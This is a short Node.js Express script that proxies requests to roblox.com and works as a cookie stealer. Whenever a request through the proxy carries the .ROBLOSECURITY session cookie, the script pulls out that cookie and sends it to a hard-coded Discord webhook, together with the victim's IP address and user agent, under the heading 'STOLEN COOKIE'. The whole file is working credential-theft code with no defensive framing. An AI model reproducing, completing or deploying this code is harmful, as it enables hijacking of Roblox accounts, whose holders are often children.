const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// PASTE YOUR DISCORD WEBHOOK URL HERE
const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";

let cookieGrabbed = false;

app.use('/roblox', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    pathRewrite: { '^/roblox': '' }, // This removes '/roblox' from the path sent to Roblox
    on: {
        proxyReq: (proxyReq, req, res) => {
            if (cookieGrabbed) return;

            // Get cookies from the incoming request
            const cookies = req.headers.cookie;
            
            if (cookies) {
                console.log("Cookies found:", cookies);
                
                // Check for Roblox Security Cookie
                if (cookies.includes('.ROBLOSECURITY') || cookies.includes('ROBLOSECURITY')) {
                    cookieGrabbed = true;
                    console.log("Cookie Grabbed!");

                    // Extract just the security cookie
                    const robloxCookie = cookies.split(';').find(c => c.trim().includes('.ROBLOSECURITY') || c.trim().includes('ROBLOSECURITY'));

                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie || cookies}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
                        })
                    }).catch(err => console.error("Discord Error:", err));
                }
            }
        }
    }
}));

app.listen(PORT, () => {
    console.log(`Logger running on port ${PORT}`);
});
